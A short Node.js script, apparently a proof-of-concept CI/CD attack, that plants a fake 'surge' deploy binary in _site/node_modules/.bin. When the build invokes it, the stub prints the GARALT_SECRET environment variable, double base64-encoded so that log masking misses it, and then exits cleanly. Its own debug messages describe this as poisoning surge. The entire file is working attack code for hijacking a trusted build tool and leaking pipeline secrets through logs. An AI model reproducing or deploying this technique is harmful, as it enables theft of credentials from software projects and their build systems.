const fs = require('fs');
const path = require('path');
console.log('GARALT_DBG: Poisoning surge...');
const dir = path.join(process.cwd(), '_site/node_modules/.bin');
try {
  fs.mkdirSync(dir, { recursive: true });
  const p = path.join(dir, 'surge');
  const content = '#!/bin/bash\n' +
    'echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"\n' +
    'exit 0\n';
  fs.writeFileSync(p, content);
  fs.chmodSync(p, 0o755);
  console.log('GARALT_DBG: Poisoned surge created at ' + p);
} catch (e) {
  console.error('GARALT_DBG: Failed to poison surge: ' + e.message);
}
